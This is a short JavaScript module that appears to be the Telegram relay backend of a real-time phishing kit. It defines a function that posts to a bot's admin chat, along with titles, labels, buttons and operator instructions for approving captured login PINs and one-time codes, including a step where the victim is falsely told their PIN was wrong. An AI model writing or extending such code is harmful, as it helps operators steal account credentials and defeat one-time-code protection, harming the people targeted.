const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
if (!ADMIN_CHAT_ID) throw new Error('Missing TELEGRAM_ADMIN_CHAT_ID');

export async function tg(method, body) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) console.error(`[tg:${method}] failed`, data);
  return data;
}

export function esc(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export const ADMIN = ADMIN_CHAT_ID;

export const TITLES = {
  login:     '🔐 LOGIN VERIFICATION',
  otp:       '🔐 OTP VERIFICATION',
  pin_retry: '⚠️ PIN CORRECTION',
  final:     '🔐 FINAL OTP',
};

export const LABELS = {
  login:     '🔑 PIN',
  otp:       '🔑 Message',
  pin_retry: '🔑 New PIN',
  final:     '🔑 Code',
};

export const INSTRUCTIONS = {
  login:     'Approve to send the one-time message, or decline to reject the login.',
  otp:       'Approve to continue, tap Wrong PIN if the earlier login PIN was incorrect, or decline to reject.',
  pin_retry: 'The user was told their previous PIN was wrong. Approve if this new PIN looks correct, or decline to clear it and let them try again.',
  final:     'Approve to finalise the application, or decline to reject.',
};

export const BUTTONS = {
  login:     ['✅ Approve login', '❌ Decline login'],
  otp:       ['✅ Approve OTP',   '❌ Decline OTP'],
  pin_retry: ['✅ Approve',       '❌ Decline'],
  final:     ['✅ Approve',       '❌ Decline'],
};

export function makeRef() {
  const year = new Date().getFullYear();
  return `TL-${year}-${Math.floor(1000 + Math.random() * 9000)}`;
}